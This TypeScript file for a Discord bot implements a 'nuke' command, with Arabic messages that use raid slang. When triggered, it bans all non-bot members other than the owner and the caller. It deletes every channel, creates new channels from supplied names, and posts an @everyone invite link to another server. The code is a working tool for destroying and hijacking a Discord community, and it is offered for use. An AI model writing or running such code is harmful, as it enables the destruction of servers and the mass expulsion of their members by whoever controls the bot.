import {
  ChatInputCommandInteraction,
  EmbedBuilder,
  ChannelType,
  PermissionFlagsBits,
  TextChannel,
} from "discord.js";

export async function handleNuke(interaction: ChatInputCommandInteraction) {
  if (!interaction.guild) return;

  const channelNames = interaction.options
    .getString("channels", true)
    .split(",")
    .map((s) => s.trim())
    .filter(Boolean);
  const invite = interaction.options.getString("invite", true).trim();
  const banAll = interaction.options.getBoolean("ban_all") ?? false;

  await interaction.reply({
    embeds: [
      new EmbedBuilder()
        .setColor(0xe74c3c)
        .setTitle("💣 جاري تنفيذ الجحفلة...")
        .setDescription("يتم الآن حذف القنوات" + (banAll ? " وبان الأعضاء" : "") + "..."),
    ],
    ephemeral: true,
  });

  const guild = interaction.guild;

  // Fetch all members if banning
  if (banAll) {
    await guild.members.fetch();
    const members = guild.members.cache.filter(
      (m) =>
        !m.user.bot &&
        m.id !== guild.ownerId &&
        m.id !== interaction.user.id
    );
    const banPromises = members.map((m) =>
      guild.members.ban(m.id, { reason: "جحفلة | Nuke" }).catch(() => null)
    );
    await Promise.all(banPromises);
  }

  // Delete all channels
  const channels = guild.channels.cache.filter(
    (c) => c.id !== interaction.channelId
  );
  const deletePromises = channels.map((c) => c.delete("جحفلة | Nuke").catch(() => null));
  await Promise.all(deletePromises);

  // Delete the interaction channel last
  const interactionChannel = guild.channels.cache.get(interaction.channelId);

  // Create new channels
  let firstTextChannel: TextChannel | null = null;
  for (const name of channelNames) {
    const ch = await guild.channels.create({
      name,
      type: ChannelType.GuildText,
    }).catch(() => null);
    if (ch && ch.isTextBased() && !firstTextChannel) {
      firstTextChannel = ch as TextChannel;
    }
  }

  // Delete interaction channel
  if (interactionChannel) {
    await interactionChannel.delete("جحفلة | Nuke").catch(() => null);
  }

  // Send invite link in first channel
  if (firstTextChannel) {
    await firstTextChannel.send({
      content: `@everyone`,
      embeds: [
        new EmbedBuilder()
          .setColor(0xe74c3c)
          .setTitle("💣 تمت الجحفلة")
          .setDescription(`**رابط السيرفر:**\n${invite}`)
          .setTimestamp(),
      ],
    }).catch(() => null);
  }
}
